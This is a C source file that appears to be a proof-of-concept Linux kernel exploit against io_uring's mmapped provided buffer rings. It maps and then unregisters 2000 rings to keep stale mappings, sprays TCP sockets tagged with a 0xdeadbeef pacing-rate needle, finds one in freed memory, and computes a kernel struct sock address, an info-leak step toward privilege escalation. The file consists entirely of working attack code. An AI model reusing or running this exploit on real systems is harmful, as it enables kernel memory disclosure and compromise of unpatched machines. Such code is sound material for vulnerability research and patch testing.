#define _GNU_SOURCE
#include <stdio.h>
#include "liburing.h"
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sched.h>
#include <pthread.h>
#include <fcntl.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <sys/resource.h>
#include <string.h>

#define N_SOCKS 2000
#define STRUCT_SOCK_MAX_RATE_OFFSET 0x1d0
#define SK_ERROR_QUEUE_OFFSET 0xc0
#define set_errno(...)                                                         \
	({                                                                     \
		typeof(__VA_ARGS__) _res = (__VA_ARGS__);                      \
		if (_res < 0)                                                  \
			errno = -_res;                                         \
		_res;                                                          \
	})

void debug_spin()
{
	puts("spinning...");
	while (1) {
		sleep(1);
	}
}
static void dump_qword_buf(char *buf, size_t n)
{
	for (size_t i = 0; i < (n / sizeof(unsigned long)); i++) {
		printf("Buf+0x%lx: 0x%lx\n", ((unsigned long)i * 8),
		       ((unsigned long *)buf)[i]);
	}
}

static int reg_buf_rings(struct io_uring *ring, int n_rings,
			 struct io_uring_buf_ring *rings[])
{
	int ret = 0;
	int n_rings_reg = 0;
	for (int i = 0; i < n_rings; i++) {
		struct io_uring_buf_reg pbuf_reg = { 0 };
		pbuf_reg.bgid = i;
		pbuf_reg.ring_entries = 256;
		pbuf_reg.flags |= IOU_PBUF_RING_MMAP;

		ret = io_uring_register_buf_ring(ring, &pbuf_reg, 0);
		if (ret < 0) {
			goto err;
		}
		void *buf_ring =
			mmap(0, 256 * sizeof(struct io_uring_buf),
			     PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,
			     ring->ring_fd,
			     IORING_OFF_PBUF_RING | ((unsigned long long)i
						     << IORING_OFF_PBUF_SHIFT));

		if (buf_ring == MAP_FAILED) {
			ret = -1;
			goto err;
		}
		rings[i] = (struct io_uring_buf_ring *)buf_ring;
		n_rings_reg++;
	}

	return 0;

err:
	for (int i = 0; i < n_rings_reg; i++) {
		munmap((void *)&rings[i],
		       sizeof(struct io_uring_buf_ring) * 256);

		io_uring_unregister_buf_ring(ring, i);
	}
	return ret;
}

static void unreg_buf_rings(struct io_uring *ring, int n_rings)
{
	for (int i = 0; i < n_rings; i++) {
		io_uring_unregister_buf_ring(ring, i);
	}
}

void spray_socks(int *socks, int n_socks)
{
	for (int i = 0; i < n_socks; i++) {
		//printf("[**] creating socket %d\n", i);
		unsigned long rate = 0xdeadbeef;
		socks[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (set_errno(socks[i]) < 0) {
			perror("socket");
			puts("[!!] failed to create socket");
			exit(1);
		}
		unsigned long fd = (unsigned long)socks[i];
		// set the upper 32 bits to be the fd
		rate = (fd << 32) + rate;
		if (setsockopt(socks[i], SOL_SOCKET, SO_MAX_PACING_RATE, &rate,
			       sizeof(unsigned long)) < 0) {
			perror("sockopt");
			puts("[!!] failed to set sock options");
		}
	}
}

struct leak_info {
	unsigned long offset;
	int fd;
};

static int find_val(char *buf, size_t n, unsigned long needle,
		    struct leak_info *info)
{
	for (size_t i = 1; i < (n / sizeof(unsigned long)); i++) {
		unsigned long val = ((unsigned long *)buf)[i];
		unsigned long val2 = ((unsigned long *)buf)[i - 1];
		if ((val & 0xffffffff) == needle &&
		    (val2 & 0xffffffff) == needle) {
			info->offset = (i * 8);
			info->fd = (int)(val >> 32);
			return 0;
		}
	}
	return -1;
}

int main()
{
	int ret = 0;
	struct io_uring ring = { 0 };
	struct io_uring_buf_ring *rings[2000] = { 0 };
	int socks[N_SOCKS] = { 0 };
	uint16_t buf_gid = 3;
	struct io_uring_sqe *sqe;
	struct io_uring_cqe *cqe;
	cpu_set_t mask = { 0 };

	// The start of the struct sock in the mmap
	unsigned long *m_struct_sock = 0x0;

	puts("[**] setting file limits to max");
	struct rlimit rlim = { 0 };
	ret = getrlimit(RLIMIT_NOFILE, &rlim);
	if (set_errno(ret) < 0) {
		perror("rlimit");
		puts("[!!] failed to get rlimit");
		exit(1);
	}
	rlim.rlim_cur = rlim.rlim_max;
	ret = setrlimit(RLIMIT_NOFILE, &rlim);
	if (set_errno(ret) < 0) {
		perror("set rlimit");
		puts("[!!] Failed to set rlimit");
		exit(1);
	}
	CPU_ZERO(&mask);
	CPU_SET(1, &mask);
	ret = sched_setaffinity(0, sizeof(cpu_set_t), &mask);
	if (set_errno(ret) < 0) {
		puts("[!!] Failed to set process affinity");
		exit(1);
	}

	puts("[**] Initializing uring");
	ret = io_uring_queue_init(10, &ring, 0);
	if (ret < 0) {
		puts("Failed to setup uring");
		exit(1);
	}
	puts("[**] initialzied ring");

	// register and mmap a ton of rings
	puts("[**] Registering buffer rings");
	ret = reg_buf_rings(&ring, 2000, rings);
	if (set_errno(ret) < 0) {
		perror("register");
		puts("Failed to register buffer rings");
		exit(1);
	}

	// unregister them
	unreg_buf_rings(&ring, 2000);

	// create a ton of sock structs with needles
	puts("[**] Spraying tty structs");
	spray_socks(socks, N_SOCKS);

	struct leak_info leak = { 0 };
	puts("[**] looking for needle");
	int ring_id = 0;
	for (ring_id = 0; ring_id < 2000; ring_id++) {
		ret = find_val((char *)rings[ring_id],
			       256 * sizeof(struct io_uring_buf), 0xdeadbeef,
			       &leak);

		if (ret == 0) {
			break;
		}
	}

	if (ret < 0) {
		puts("[!!] failed to find leak. Try again");
		exit(1);
	}

	printf("[**] Found needle in ring %d at offset 0x%lx\n", ring_id,
	       leak.offset);
	printf("[**] Socket fd: %d\n", leak.fd);

	m_struct_sock =
		((unsigned long *)rings[ring_id]) - STRUCT_SOCK_MAX_RATE_OFFSET;

	printf("[**] m_struct_sock 0x%lx\n", (unsigned long)m_struct_sock);
	// struct sock->sk_error_queue->next is initialized as a pointer to itself.
	// It can be used to get the actual address of the socket.
	unsigned long struct_sock_addr =
		m_struct_sock[SK_ERROR_QUEUE_OFFSET / sizeof(unsigned long)] -
		SK_ERROR_QUEUE_OFFSET;

	printf("[**] struct sock address: 0x%lx\n", struct_sock_addr);

	return 0;
}
